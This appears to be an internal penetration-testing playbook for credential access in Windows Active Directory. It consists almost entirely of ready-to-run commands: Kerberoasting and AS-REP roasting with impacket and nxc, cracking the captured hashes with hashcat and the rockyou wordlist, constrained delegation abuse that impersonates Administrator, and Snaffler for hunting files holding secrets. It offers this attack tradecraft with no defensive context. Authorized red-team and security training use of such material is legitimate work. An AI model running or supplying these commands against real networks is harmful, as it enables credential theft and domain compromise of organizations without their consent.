---
kind: reference
platform: generic
scope: internal
os: windows
tags: [kerberos, hashcat, impacket, credentials]
---

# Credential Access Playbook

## Kerberoasting

<!-- meta: technique=kerberoasting -->
```bash
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request
```

<!-- meta: technique=hash-cracking -->
```bash
hashcat -m 13100 roast.txt /usr/share/wordlists/rockyou.txt
```

## AS-REP roasting

<!-- meta: technique=asreproasting -->
```bash
nxc ldap TARGET -u USER -p PASS --asreproast asrep.txt
```

<!-- meta: technique=hash-cracking -->
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## Constrained delegation abuse

<!-- meta: technique=delegation-abuse -->
```bash
impacket-getST -spn 'CIFS/HOST.DOMAIN' -impersonate Administrator 'DOMAIN/USER:PASS' -altservice CIFS
```

## Loot files (Snaffler)

<!-- meta: technique=data-discovery -->
```bash
.\snaffler.exe -o output.txt
```
